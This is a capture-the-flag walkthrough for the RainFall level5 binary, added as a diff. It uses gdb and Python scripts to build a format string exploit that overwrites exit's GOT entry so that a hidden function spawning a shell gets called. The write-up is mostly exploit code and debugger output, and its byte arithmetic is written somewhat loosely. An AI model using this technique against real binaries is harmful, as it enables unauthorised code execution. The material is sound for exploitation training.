@@ -1,0 +1,272 @@
+(gdb) disas main
+Dump of assembler code for function main:
+   0x08048504 <+0>:	push   %ebp
+   0x08048505 <+1>:	mov    %esp,%ebp
+   0x08048507 <+3>:	and    $0xfffffff0,%esp
+   0x0804850a <+6>:	call   0x80484c2 <n>
+   0x0804850f <+11>:	leave
+   0x08048510 <+12>:	ret
+End of assembler dump.
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+
+level5@RainFall:~$ objdump -t level5
+...
+080484a4 g     F .text	0000001e              o
+...
+
+With objdump we can discover another function 'o' and disas it with gdb
+
+(gdb) disas o
+Dump of assembler code for function o:
+   0x080484a4 <+0>:	push   %ebp
+   0x080484a5 <+1>:	mov    %esp,%ebp
+   0x080484a7 <+3>:	sub    $0x18,%esp
+   0x080484aa <+6>:	movl   $0x80485f0,(%esp)
+   0x080484b1 <+13>:	call   0x80483b0 <system@plt>
+   0x080484b6 <+18>:	movl   $0x1,(%esp)
+   0x080484bd <+25>:	call   0x8048390 <_exit@plt>
+End of assembler dump.
+
+We want to call is uncalled function to get access to the system call of /bin/sh
+To do that we want to use again the format string exploit.
+
+We know the address of o : 
+
+(gdb) p &o
+$1 = (<text variable, no debug info> *) 0x80484a4 <o>
+
+and we know the address of the exit function from GOT (Global Offset Table)
+
+From function n : 
+
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+
+....
+(gdb) disas 0x80483d0
+Dump of assembler code for function exit@plt:
+   0x080483d0 <+0>:	jmp    *0x8049838
+   0x080483d6 <+6>:	push   $0x28
+   0x080483db <+11>:	jmp    0x8048370
+End of assembler dump.
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+
+We can manually activate the exploit but it won't work because of gdb :
+
+(gdb) disas n
+Dump of assembler code for function n:
+   0x080484c2 <+0>:	push   %ebp
+   0x080484c3 <+1>:	mov    %esp,%ebp
+   0x080484c5 <+3>:	sub    $0x218,%esp
+   0x080484cb <+9>:	mov    0x8049848,%eax
+   0x080484d0 <+14>:	mov    %eax,0x8(%esp)
+   0x080484d4 <+18>:	movl   $0x200,0x4(%esp)
+   0x080484dc <+26>:	lea    -0x208(%ebp),%eax
+   0x080484e2 <+32>:	mov    %eax,(%esp)
+   0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
+   0x080484ea <+40>:	lea    -0x208(%ebp),%eax
+   0x080484f0 <+46>:	mov    %eax,(%esp)
+   0x080484f3 <+49>:	call   0x8048380 <printf@plt>
+   0x080484f8 <+54>:	movl   $0x1,(%esp)
+   0x080484ff <+61>:	call   0x80483d0 <exit@plt>
+End of assembler dump.
+(gdb) b * n + 49
+Breakpoint 1 at 0x80484f3
+(gdb) b * n + 61
+Breakpoint 2 at 0x80484ff
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) r
+Starting program: /home/user/level5/level5
+hello there
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) set{int}0x8049838=0x80484a4
+(gdb) c
+Continuing.
+hello there
+
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080484a4
+(gdb) c
+Continuing.
+$ (We have a shell here but it's at level5 not level6)
+
+This is what we are going to do but with a script to simplify everything.
+
+We first need to find which block we need to start writing at :
+
+python /tmp/exploit.py | ./level5
+AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXlevel5@RainFall:~$
+
+import struct
+
+FT_O =                  0x80484a4
+EXIT_GOT=               0x8049838
+
+def pad(s):
+    return s+"X"*(512-len(s))
+
+exploit=""
+exploit+="AAAABBBBCCCC"
+exploit+= "%x " * 4
+
+print pad(exploit)
+
+We now that we need to start writing at the 4th block
+So we need to overwrite the address of exit with the one from o
+
+(gdb) b * n + 49
+Breakpoint 1 at 0x80484f3
+(gdb) b * n + 61
+Breakpoint 2 at 0x80484ff
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) r < /tmp/toto
+Starting program: /home/user/level5/level5 < /tmp/toto
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x00000013
+
+We see here that we overwrote it by a little
+
+0x00000013 and we need 0x80484a4
+
+import struct
+
+FT_O =                  0x80484a4
+EXIT_GOT=               0x8049838
+
+def pad(s):
+    return s+"X"*(512-len(s))
+
+exploit=""
+exploit+= struct.pack("I", EXIT_GOT)
+exploit+="AAAABBBBCCCC"
+exploit+= "%4$n " * 4
+
+print pad(exploit)
+
+We can deduce how much we need to get to the right address :
+
+0x80484a4 == 134513828
+
+A little too much isn't it?
+
+Fortunately for us there is a better solution in 2 steps :
+		   +3 +2 +1 +0 (Offset)
+o :		0x 08 04 84 a4
+got :	0x 00 00 00 00
+
+We first want to write  84 a4 the lowest bits first on GOT:
+
+Let's try to write with a padding of 30 :
+
+exploit+= "%4$30x"
+exploit+= "%4$n"
+
+(gdb) r < /tmp/toto
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level5/level5 < /tmp/toto
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) c
+Continuing.
+
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x0000002e
+
+We overwrite the address with 0x2e == 46
+We need 0x84a4 == 33956
+46 - 30 (PADDING) = 16
+We need to overwrite from 33940 for the first 2 bits
+
+
+exploit+= "%4$33940x"
+exploit+= "%4$n"
+
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x000084a4
+
+And it worked !
+
+Now we can do the same for the highest bits.
+
+To do that we need a little trick
+
+GOT address is now : 
+
+ XX  00 00 84 a4
+
+And we want it to be :
+
+ XX 08 48 84 a4
+
+To do that we need to overwflow the X bits on the left like this :
+
+ X1 08 48 84 a4
+
+We 30 bits padding we have :
+
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x84c284a4
+
+0x84c2 -> 0x10804
+
+0x10804 - 0x84c2 = 0x8342
+
+67588 - 33986 = 33602
+
+And we need to add the padding of 30 :
+
+33602 + 30 = 33632
+
+Let's try that again :
+
+(gdb) r < /tmp/toto
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/user/level5/level5 < /tmp/toto
+
+Breakpoint 1, 0x080484f3 in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080483d6
+(gdb) c
+...
+Breakpoint 2, 0x080484ff in n ()
+(gdb) x 0x8049838
+0x8049838 <exit@got.plt>:	0x080484a4
+
+And we are good !
